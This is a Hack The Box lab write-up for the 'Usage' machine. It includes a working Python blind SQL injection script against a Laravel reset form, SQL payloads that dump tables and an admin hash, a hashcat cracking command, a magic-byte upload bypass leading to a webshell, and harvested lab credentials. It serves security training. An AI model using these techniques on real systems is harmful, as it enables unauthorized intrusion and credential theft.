---
title: Usage
draft: false
tags:
---

![[Usage.png]]

Machine: https://app.hackthebox.com/machines/Usage

---
# Enumeration
## Port  Scanning
- Lets start with the classical port scanning and get the service and version running, using  [[content/Tools/Activas/3. Escaneo de puertos/nmap|nmap]]
```bash
nmap -p- -sS -n -Pn --min-rate 5000 10.10.11.18
nmap -p22,80 -sVC -Pn -n --min-rate 5000 22,80 10.10.11.18
```
>[!example]- Result
>![[Pasted image 20250320105013.png]]

## Web Site
- Lets get the tecnologies running on this web page using [[wappanalyzer]] and [[whatweb]]
```bash
whatweb http://usage.htb/
```
>[!example]- Result
>![[Pasted image 20250320105352.png]]
>![[Pasted image 20250320105431.png]]

- the web side allow us to register, login and there is a "reset password form" and seems to be vulnerable to SQLi
```bash
1' or '1' = '1' -- -
```
>[!example]- Result
>![[Pasted image 20250320121039.png]]
>![[Pasted image 20250320121012.png]]

# Exploitation
- maybe we can try to get a valid email using a script, lets check some SQLi
```
test@test.com' and substring(database(),1,1) = 'U' -- -
```
>[!example]- Result
>![[Pasted image 20250320141831.png]]
>![[Pasted image 20250320141756.png]]

- nice lets make a python  script to automate this process, I have noticed that, when u send the post request, the server respond with a 302 redirect, with some cookies, and the final respond appear when u use this cookies into a GET repuest, so this is my code:
```python
#!/usr/bin/python3

import signal, sys, time, requests
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# CTRL + C  
signal.signal(signal.SIGINT, def_handler)

def makeSQLi():
    final_string = ""
    p1 = log.progress("Brute Force")
    p1.status("Starting attack")
    time.sleep(2)

    p2 = log.progress("Value")

    main_url = "http://usage.htb/forget-password"
    characters = string.printable
    headers = {
        "Host": "usage.htb",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "http://usage.htb/forget-password",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0"
    }

    for position in range(1,250):
        for character in characters:
            # Post data
            post_data = {
                "_token": None,
                #"email": "test@test.com' and substring(database(),1,1=) 'U'-- -"
                "email": "test@test.com' and substring(database(),%d,1) = '%s' -- -" % (position, character) 
            }
            # Cookies to send
            cookies = {
                "XSRF-TOKEN": None,
                "laravel_session": None
            }

            # 1st send a get recuest with out cookies
            r = requests.get(main_url)
            values = getCookiesValues(r.headers.get('Set-Cookie'))
            cookies["XSRF-TOKEN"] = values[0]
            cookies["laravel_session"] = values[1]
            # Code to find "_token" value on HTML
            start = r.text.find('value="') + len('value="')
            end = r.text.find('"', start)
            token = r.text[start:end]
            post_data["_token"] = token
            #print(headers)
            #print(post_data)
            #print(cookies)
            #--------------------------------------------------------------------------------------------------------
        
            # 2nd Sending POST recuest
            r = requests.post(main_url,headers=headers, cookies=cookies,data=post_data, allow_redirects=False)
            #print(r.status_code)
            #--------------------------------------------------------------------------------------------------------
            # 3rd Update cookies and get que server response
            r = requests.get(main_url, cookies=cookies)
            #print(r.status_code)
            #print(r.text)

            if "We have e-mailed your password reset link to" in r.text:
                final_string += character
                p2.status(final_string)
                break


    sys.exit(0)

def getCookiesValues(set_cookie):
    for cookie in set_cookie.split(','):
        if 'XSRF-TOKEN' in cookie:
            xsrf_token = cookie.split('=')[1].split(';')[0]
        if 'laravel_session' in cookie:
            laravel_session = cookie.split('=')[1].split(';')[0]
    return [xsrf_token,laravel_session]

if __name__ == '__main__':
    makeSQLi()
```

>[!exmple]- Result
>![[Pasted image 20250320174540.png]]

The script run slow but works, we are getting the database name
Database name: `usage_blog`
- now we can modify the script to get the value we want, for example lets list the tables of this data base `1' or substring((SELECT GROUP_CONCAT(TABLE_NAME SEPARATOR ',') FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'usage_blog'),1,1) = 'a' -- -`
>[!example]- Result
>![[Pasted image 20250320184858.png]]
>![[Pasted image 20250321222758.png]]

>[!info]- Check the number of result of a record, for example, the number of tables
>```sql
>1' or (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='usage_blog')=15 -- -
>```

- Now getting the name of the column of a table, `1' OR SUBSTRING( (SELECT GROUP_CONCAT(COLUMN_NAME SEPARATOR ',') FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'usage_blog' AND TABLE_NAME = 'admin_users' ), %d, 1 ) = '%s' -- -`

>[!example]- Result
>![[Pasted image 20250323113427.png]]

- perfect we have to just enumerate the rows of this columns: `1' or substring((select group_concat(username,':',password separator ', ') from usage_blog.admin_users),%d,1) = '%s'`

creds: `admin:$2y$10$ohq2klpbh/ri.p5wr0p3uomc24ydvl9da9h1s6ooomgh5xvfuprl2`

- lets try to brute force the password using hashcat on mode "3200" or using [hashes.com](https://hashes.com)
```bash
.\hashcat.exe -m 3200 .\adminHash .\xato-net-10-million-passwords.txt -w 3
```
>[!example]- Result
>![[Pasted image 20250323120701.png]]
>![[Pasted image 20250323120915.png]]

decrypted: `admin:whatever1`

- And now we can login at `admin.usage.htb`
>[!example]- Result
>![[Pasted image 20250323121106.png]]

# Enumeration 2
- At dashboard we can see the used versions
>[!example]- result
>![[Pasted image 20250323121407.png]]

- checking the web side, i see this form, where we can upload a file
>[!example]- Result
>![[Pasted image 20250323134215.png]]

- if we can upload a file, it have to be saved in some place, web can use [[gobuster]] in order to find this place (we have to use the cookies)
```bash
gobuster dir -u 'http://admin.usage.htb/' -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -c 'XSRF-TOKEN=eyJpdiI6IkNPaU90WmNoT32Uz[snip]oiIn0%3D; laravel_session=eyJpdiI[snip]IjoiIn0%3D; remember_admin_59ba36addc2b2f940158[snip]oiIn0%3D' -t 1 --add-slash| grep -v "Status: 503"
```
>[!example]- Result
>![[Pasted image 20250323140048.png]]
>![[Pasted image 20250323155855.png]]

- if we upload a file, it appear here
>[!example]- Result
>![[Pasted image 20250323160238.png]]
>![[Pasted image 20250323160249.png]]

# Exploitation 2
- If we try to upload a php file the web page says that we cant, we can use the ["magic numbers"](https://en.wikipedia.org/wiki/Magic_number_(programming)) in order to get allowed to upload the file, we just have to go with trial and error attempts, using [[hexedit]]
First bytes: `FFD8 DDE0, FFD8 FFDB or FFD8 FFE1`
last bytes: `FFD9`

>[!example]- Before
>![[Pasted image 20250323163334.png]]

>[!example]- Editing
>![[Pasted image 20250323163713.png]]

>[!example]- After
>![[Pasted image 20250323164028.png]]

- now we can upload the file
>[!example]- Result
>![[Pasted image 20250323164135.png]]
>![[Pasted image 20250323164145.png]]
>we change this string to "cmd2.php"
![[Pasted image 20250323164533.png]]
![[Pasted image 20250323164602.png]]

- Perfect now we have command execution
>[!example]- Result
>![[Pasted image 20250323164632.png]]

- lets get a revershell (you have to be fast, because the file is removed)
>[!example]- result
>![[Pasted image 20250323165125.png]]

# Privilege Exalation
## Enumeration
- If we check the config files and enviroment files we can see a credentials to get access to the mysql database, is the same database as before
>[!example]- Result
>![[Pasted image 20250323170257.png]]

Credentials: `staff:s3cr3t_c0d3d_1uth`
DB Name: `usage_blog`

- we can exfiltrate more users, but we cant use it
>[!example]- Result
>![[Pasted image 20250323170635.png]]

Credentials:
`raj:raj@raj.com:xander`
`raj:raj@usage.com:xander`

- after looking for something interesting i see this file `.monitrc` and looks like there is a password of a http service running on port 2812, 
>[!example]- Result
>![[Pasted image 20250323180444.png]]

Creds: `admin:3nc0d3d_pa$$w0rd`

- we can check if this service works, sending a request
```bash
echo -e "HEAD / HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n" | nc localhost 2812
```
>[!example]- Result
>![[Pasted image 20250323182923.png]]

- in order to work better we can port forwarding this port (local port forwarding), and we can use SSH (because there is a id_rsa)
```bash
chmod 600 id_rsa
ssh -L 1234:10.10.16.7:2812 dash@10.10.11.18 -i id_rsa
```
>[!example]- Result
>![[Pasted image 20250323183250.png]]
>![[Pasted image 20250323183947.png]]

- perfect now we can get access to this service
>[!example]- Result
>![[Pasted image 20250323184532.png]]

